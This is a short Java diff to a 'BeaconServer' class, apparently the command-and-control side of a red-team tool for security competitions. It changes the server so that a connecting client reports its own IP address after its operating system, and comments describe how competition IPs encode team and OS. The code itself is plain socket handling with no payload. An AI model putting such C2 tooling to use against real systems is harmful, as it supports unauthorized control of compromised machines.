@@ -250,12 +250,16 @@ public class BeaconServer implements Runnable{
                 Socket socket = serverSocket.accept();
                 Duplexer duplexer = new Duplexer(socket);
 
-                // Get clients IP Address
-                // getRemoteSocketAddress retruns in the form /IPAddress:Port (i.e. /1.2.3.4:12345)
-                // Just get ride of the / at the start, because we need the port incase a machine is sitting behind nat
-                String IPAddress = socket.getRemoteSocketAddress().toString().substring(1);
+                // First message is from the client is the Operating System, Windows or Linux
                 String OSMessage = duplexer.receive();
                 System.out.println("Inital Message: " + OSMessage);
+
+                // Second Message is from the client to the server, the IP address of the client.
+                // The Client sends it's own IP Address, so that all of the IP addresses are not viewed as NAT'd ip addresses
+                // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
+                // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
+                String IPAddress = duplexer.receive();
+                System.out.println("IP Address: " + IPAddress);
                 
                 if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                     // Send message to C2 announcing that a new client has been obtained
